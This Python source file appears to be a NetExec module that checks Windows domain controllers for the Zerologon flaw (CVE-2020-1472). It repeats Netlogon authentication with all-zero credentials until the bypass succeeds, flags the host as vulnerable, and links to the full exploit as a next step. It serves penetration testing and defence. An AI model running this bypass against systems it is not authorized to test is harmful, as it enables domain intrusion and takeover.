# everything is comming from https://github.com/dirkjanm/CVE-2020-1472
# credit to @dirkjanm
# module by : @mpgn_x64
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
import sys
from nxc.helpers.misc import CATEGORY
from nxc.helpers.rpc import NXCRPCConnection
from nxc.logger import nxc_logger

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
MAX_ATTEMPTS = 2000  # False negative chance: 0.04%


class NXCModule:
    name = "zerologon"
    description = "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472"
    supported_protocols = ["smb", "wmi"]
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """"""

    def on_login(self, context, connection):
        self.context = context
        if self.perform_attack(connection, "\\\\" + connection.hostname, connection.host, connection.hostname, connection.host):
            self.context.log.highlight("VULNERABLE")
            self.context.log.highlight("Next step: https://github.com/dirkjanm/CVE-2020-1472")
            try:
                host = self.context.db.get_hosts(connection.host)[0]
                self.context.db.add_host(
                    host.ip,
                    host.hostname,
                    host.domain,
                    host.os,
                    host.smbv1,
                    host.signing,
                    zerologon=True,
                )
            except Exception:
                self.context.log.debug("Error updating zerologon status in database")

    def perform_attack(self, connection, dc_handle, dc_ip, target_computer, remoteHost):
        # Keep authenticating until successful. Expected average number of attempts needed: 256.
        self.context.log.debug("Performing authentication attempts...")
        rpc_con = None
        try:
            binding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
            string_binding = binding.replace(remoteHost, dc_ip)
            rpc_con = NXCRPCConnection(connection).connect(
                None,
                nrpc.MSRPC_UUID_NRPC,
                string_binding=string_binding,
                set_remote_host=remoteHost,
                anonymous_rpc=True,
            )
            for _attempt in range(MAX_ATTEMPTS):
                result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
                if result:
                    return True
            else:
                self.context.log.highlight("Attack failed. Target is probably patched.")
        except DCERPCException:
            self.context.log.fail("Error while connecting to host: DCERPCException, which means this is probably not a DC!")


def fail(msg):
    nxc_logger.debug(msg)
    nxc_logger.fail("This might have been caused by invalid arguments or network issues.")
    sys.exit(2)


def try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.

    # Use an all-zero challenge and credential.
    plaintext = b"\x00" * 8
    ciphertext = b"\x00" * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212FFFFF

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            dc_handle + "\x00",
            target_computer + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + "\x00",
            ciphertext,
            flags,
        )

        # It worked!
        assert server_auth["ErrorCode"] == 0
        return True

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xC0000022:
            return None
        else:
            fail(f"Unexpected error code from DC: {ex.get_error_code()}.")
    except BaseException as ex:
        fail(f"Unexpected error: {ex}.")
